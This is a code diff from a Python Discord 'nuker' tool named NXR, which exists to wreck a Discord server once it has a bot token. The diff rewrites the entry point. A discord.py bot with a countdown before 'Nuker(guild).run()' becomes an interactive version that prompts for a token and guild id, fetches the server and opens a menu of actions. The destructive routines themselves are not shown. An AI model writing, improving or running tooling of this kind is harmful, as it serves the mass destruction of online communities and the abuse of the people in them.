-    log("NXR", f"logged in  ·  {Col.CY}{Col.B}{bot.user}{Col.R}  "
-               f"{Col.GY}({bot.user.id}){Col.R}", Col.MG)
+    banner()
 
-    if _run_once:
-        return
-    _run_once = True
-
-    # countdown
-    for i in range(Config.COUNTDOWN, 0, -1):
-        log("...", f"starting in {Col.YL}{i}{Col.R}", Col.YL)
-        await asyncio.sleep(1)
-
-    guild = bot.get_guild(Config.GUILD_ID)
-    if not guild:
-        log("ERR", f"guild {Config.GUILD_ID} not found  ·  "
-                   f"bot must be in server", Col.RD)
+    token = prompt("bot token")
+    gid = prompt("guild id")
+    if not token or not gid:
+        log("ERR", "token and guild id required", C_ERR)
         return
 
-    await Nuker(guild).run()
+    async with NXRNuker(token, gid) as n:
+        info = await n.fetch_guild()
+        if "error" in info:
+            log("ERR", f"guild fetch failed: {info}", C_ERR)
+            return
+        log("OK", f"{info['name']}  |  members: {info.get('approximate_member_count','?')}", C_OK)
+        await menu(n)
 
-@bot.event
-async def on_error(event, *args, **kwargs):
-    # never crash the loop
-    return
-
-# ═══════════════════════════════════════════════════════════
-#                        MAIN
-# ═══════════════════════════════════════════════════════════
-
-def main():
-    if Config.TOKEN.startswith("PUT_"):
-        clear()
-        print(BANNER)
-        log("ERR", "set your TOKEN in Config or NXR_TOKEN env", Col.RD)
-        sys.exit(1)
-    if not Config.GUILD_ID:
-        clear()
-        print(BANNER)
-        log("ERR", "set GUILD_ID in Config or NXR_GUILD env", Col.RD)
-        sys.exit(1)
-    try:
-        bot.run(Config.TOKEN, log_handler=None)
-    except discord.LoginFailure:
-        log("ERR", "invalid bot token", Col.RD)
-    except KeyboardInterrupt:
-        log("NXR", "aborted by user", Col.YL)
 
 if __name__ == "__main__":
-    main()
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        print(f"\n{C_ERR}aborted.{RESET}")
